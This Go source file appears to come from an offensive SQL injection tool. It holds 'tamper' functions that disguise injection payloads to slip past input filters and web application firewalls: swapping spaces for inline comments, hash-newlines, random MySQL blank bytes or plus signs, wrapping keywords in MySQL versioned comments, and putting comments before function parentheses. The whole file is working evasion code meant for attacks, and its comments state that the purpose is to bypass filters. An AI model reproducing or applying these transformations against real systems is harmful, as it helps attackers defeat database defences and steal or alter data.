package tamper

import "strings"

// space2comment replaces spaces with the MySQL inline comment /**/, e.g.
// "SELECT 1 FROM" -> "SELECT/**/1/**/FROM". This is the most widely supported
// whitespace-removal tamper and evades filters that strip single spaces only.
func space2comment(payload string) string {
	var sb strings.Builder
	sb.Grow(len(payload) + 8)
	for _, r := range payload {
		if isSpace(r) {
			sb.WriteString("/**/")
		} else {
			sb.WriteRune(r)
		}
	}
	return sb.String()
}

// space2hash replaces spaces with a hash plus newline, e.g.
// "SELECT 1 FROM" -> "SELECT#\n1#\nFROM". Works on databases where # is a
// line comment (MySQL, some PostgreSQL configurations).
func space2hash(payload string) string {
	var sb strings.Builder
	sb.Grow(len(payload) + 8)
	first := true
	for _, r := range payload {
		if isSpace(r) {
			sb.WriteByte('#')
			sb.WriteByte('\n')
			first = true
			continue
		}
		// Avoid an empty '#' when there are two adjacent spaces.
		if !first && sb.Len() > 0 && sb.String()[sb.Len()-1] == '#' {
			sb.WriteByte('\n')
		}
		sb.WriteRune(r)
		first = false
	}
	return sb.String()
}

// space2mysqlblank replaces spaces with a MySQL-specific whitespace byte such
// as a tab or a vertical tab, e.g. "SELECT\t1\tFROM".
func space2mysqlblank(payload string) string {
	blank := []byte{0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20, 0xa0}
	var sb strings.Builder
	sb.Grow(len(payload) + 8)
	for _, r := range payload {
		if isSpace(r) {
			sb.WriteByte(blank[randSource().IntN(len(blank))])
		} else {
			sb.WriteRune(r)
		}
	}
	return sb.String()
}

// space2plus replaces spaces with a '+' sign, e.g. "SELECT+1+FROM". This is
// valid only where '+' is treated as whitespace in the query context, so it
// is best used in numeric/URL contexts.
func space2plus(payload string) string {
	var sb strings.Builder
	sb.Grow(len(payload) + 4)
	for _, r := range payload {
		if isSpace(r) {
			sb.WriteByte('+')
		} else {
			sb.WriteRune(r)
		}
	}
	return sb.String()
}

// versionedmorph wraps the payload in a MySQL versioned comment with a high
// version that always executes, e.g. "/*!50000SELECT 1*/".
func versionedmorph(payload string) string {
	return "/*!50000" + payload + "*/"
}

// versionedkeywords rewrites each SQL keyword into a versioned comment form,
// e.g. "SELECT" -> "/*!SELECT*/". Keywords are recognised by a small set.
func versionedkeywords(payload string) string {
	keywords := []string{
		"SELECT", "FROM", "WHERE", "AND", "OR", "UNION", "INSERT", "UPDATE",
		"DELETE", "ORDER", "GROUP", "BY", "HAVING", "LIMIT", "OFFSET", "JOIN",
		"LEFT", "RIGHT", "INNER", "OUTER", "CROSS", "AS", "ON", "NOT", "NULL",
		"EXCEPT", "INTERSECT", "INTO", "VALUES", "SET", "CREATE", "ALTER",
		"DROP", "TABLE", "INDEX", "TRUNCATE", "BEFORE", "AFTER", "CASE",
		"WHEN", "THEN", "ELSE", "END", "DISTINCT", "LIKE", "IN", "IS",
	}
	out := payload
	for _, kw := range keywords {
		out = replaceKeyword(out, kw, "/*!"+kw+"*/")
	}
	return out
}

// commentbeforeparen inserts a comment between a function name and its opening
// parenthesis, e.g. "FUNC(" -> "FUNC/**/(". This bypasses filters that match
// on "FUNC(" as an exact token.
func commentbeforeparen(payload string) string {
	var sb strings.Builder
	sb.Grow(len(payload) + 8)
	for i := 0; i < len(payload); i++ {
		c := payload[i]
		if c == '(' && i > 0 && isIdentChar(payload[i-1]) {
			// Look back to confirm the preceding char belongs to a function
			// identifier (letter/digit/underscore already checked).
			sb.WriteString("/**/")
		}
		sb.WriteByte(c)
	}
	return sb.String()
}

func isIdentChar(c byte) bool {
	return c == '_' || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')
}

// replaceKeyword replaces a whole SQL keyword (word-boundary aware) in s.
func replaceKeyword(s, keyword, repl string) string {
	lower := strings.ToLower(s)
	kw := strings.ToLower(keyword)
	var sb strings.Builder
	i := 0
	for i < len(s) {
		if i+len(kw) <= len(s) && lower[i:i+len(kw)] == kw {
			beforeOK := i == 0 || !isIdentChar(s[i-1])
			afterOK := i+len(kw) == len(s) || !isIdentChar(s[i+len(kw)])
			if beforeOK && afterOK {
				sb.WriteString(repl)
				i += len(kw)
				continue
			}
		}
		sb.WriteByte(s[i])
		i++
	}
	return sb.String()
}
